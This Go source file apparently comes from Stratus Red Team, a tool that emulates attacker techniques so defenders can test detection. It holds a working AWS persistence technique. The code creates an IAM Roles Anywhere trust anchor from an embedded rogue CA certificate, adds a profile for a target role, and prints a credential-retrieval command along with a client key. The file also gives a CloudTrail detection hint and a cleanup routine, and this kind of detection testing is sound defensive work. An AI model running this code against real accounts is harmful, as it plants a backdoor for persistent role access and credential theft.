package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/rolesanywhere"
	"github.com/aws/aws-sdk-go-v2/service/rolesanywhere/types"
	"github.com/datadog/stratus-red-team/v2/internal/utils"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"log"
)

const trustAnchorName = "malicious-rolesanywhere-trust-anchor"
const profileName = "malicious-rolesanywhere-profile"

//go:embed ca.crt
var maliciousCACertificate string

//go:embed client.key
var clientKey string

//go:embed client.crt
var clientCertificate string

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.persistence.rolesanywhere-create-trust-anchor",
		FriendlyName: "Create an IAM Roles Anywhere trust anchor",
		Description: `
Establishes persistence by creating an IAM Roles Anywhere trust anchor. 
The IAM Roles Anywhere service allows workloads that do not run in AWS to assume roles by presenting a client-side 
X.509 certificate signed by a trusted certificate authority, called a "trust anchor".

Assuming IAM Roles Anywhere is in use (i.e., that some of the IAM roles in the account have a 
[trust policy](https://docs.aws.amazon.com/rolesanywhere/latest/userguide/trust-model.html#trust-policy) trusting 
the IAM Roles Anywhere service), an attacker creating a trust anchor can subsequently assume these roles.

Warm-up:

- Create an IAM role that can be used by IAM Roles Anywhere (see [docs](https://docs.aws.amazon.com/rolesanywhere/latest/userguide/getting-started.html#getting-started-step2))

Detonation: 

- Create an IAM Roles Anywhere trust anchor
- Create an IAM Roles Anywhere profile

References:

- https://docs.aws.amazon.com/rolesanywhere/latest/userguide/trust-model.html
- https://docs.aws.amazon.com/rolesanywhere/latest/userguide/getting-started.html
`,
		Detection: `
Identify when a trust anchor is created, through CloudTrail's <code>CreateTrustAnchor</code> event.
`,
		Platform:                   stratus.AWS,
		PrerequisitesTerraformCode: tf,
		IsIdempotent:               false, // cannot create twice a Trust anchor with the same name
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence, mitreattack.PrivilegeEscalation},
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	rolesAnywhereClient := rolesanywhere.NewFromConfig(providers.AWS().GetConnection())
	roleArn := params["role_arn"]
	tags := []types.Tag{
		{Key: aws.String("StratusRedTeam"), Value: aws.String("true")},
	}

	log.Println("Creating a malicious trust anchor")
	trustAnchorResult, err := rolesAnywhereClient.CreateTrustAnchor(context.Background(), &rolesanywhere.CreateTrustAnchorInput{
		Name: aws.String(trustAnchorName),
		Source: &types.Source{
			SourceData: types.SourceData(
				&types.SourceDataMemberX509CertificateData{Value: maliciousCACertificate},
			),
			SourceType: types.TrustAnchorTypeCertificateBundle,
		},
		Enabled: aws.Bool(true),
		Tags:    tags,
	})
	if err != nil {
		return errors.New("Unable to create malicious trust anchor: " + err.Error())
	}

	profileResult, err := rolesAnywhereClient.CreateProfile(context.Background(), &rolesanywhere.CreateProfileInput{
		Name:            aws.String(profileName),
		RoleArns:        []string{roleArn},
		Enabled:         aws.Bool(true),
		DurationSeconds: aws.Int32(3600 * 12),
		Tags:            tags,
	})
	if err != nil {
		return errors.New("Unable to create malicious profile: " + err.Error())
	}

	log.Printf("Created malicious trust anchor %s and profile %s\n", *trustAnchorResult.TrustAnchor.TrustAnchorArn, *profileResult.Profile.ProfileArn)
	log.Println("Optionally, you can use the following command to retrieve temporary credentials using a client-side certificate signed by the new malicious trust anchor")
	log.Printf(
		"aws_signing_helper credential-process --private-key client.key --certificate client.crt --trust-anchor-arn %s --role-arn %s --profile-arn %s\n",
		*trustAnchorResult.TrustAnchor.TrustAnchorArn,
		roleArn,
		*profileResult.Profile.ProfileArn,
	)
	log.Printf("With:\nclient.key:\n%s\n\nclient.crt:\n%s", clientKey, clientCertificate)
	return nil
}

func revert(_ map[string]string, providers stratus.CloudProviders) error {
	rolesanywhereClient := rolesanywhere.NewFromConfig(providers.AWS().GetConnection())

	errTrustAnchor := removeTrustAnchor(rolesanywhereClient)
	errProfile := removeProfile(rolesanywhereClient)

	return utils.CoalesceErr(errTrustAnchor, errProfile)
}

func removeTrustAnchor(client *rolesanywhere.Client) error {
	result, err := client.ListTrustAnchors(context.Background(), &rolesanywhere.ListTrustAnchorsInput{
		PageSize: aws.Int32(500),
	})
	if err != nil {
		return err
	}

	for i := range result.TrustAnchors {
		if *result.TrustAnchors[i].Name == trustAnchorName {
			log.Println("Removing malicious trust anchor " + trustAnchorName)
			_, err := client.DeleteTrustAnchor(context.Background(), &rolesanywhere.DeleteTrustAnchorInput{
				TrustAnchorId: result.TrustAnchors[i].TrustAnchorId,
			})
			if err != nil {
				return errors.New("Unable to remove trust anchor: " + err.Error())
			}
			log.Println("Removed trust anchor " + *result.TrustAnchors[i].TrustAnchorId)
			return nil
		}
	}

	return errors.New("could not find malicious trust anchor")
}

func removeProfile(client *rolesanywhere.Client) error {
	profiles, err := client.ListProfiles(context.Background(), &rolesanywhere.ListProfilesInput{
		PageSize: aws.Int32(500),
	})
	if err != nil {
		return err
	}

	for i := range profiles.Profiles {
		if *profiles.Profiles[i].Name == profileName {
			log.Println("Removing malicious profile" + profileName)
			_, err := client.DeleteProfile(context.Background(), &rolesanywhere.DeleteProfileInput{
				ProfileId: profiles.Profiles[i].ProfileId,
			})
			if err != nil {
				return errors.New("Unable to remove profile: " + err.Error())
			}
			log.Println("Removed malicious profile " + profileName)
			return nil
		}
	}

	return errors.New("could not find malicious profile")
}
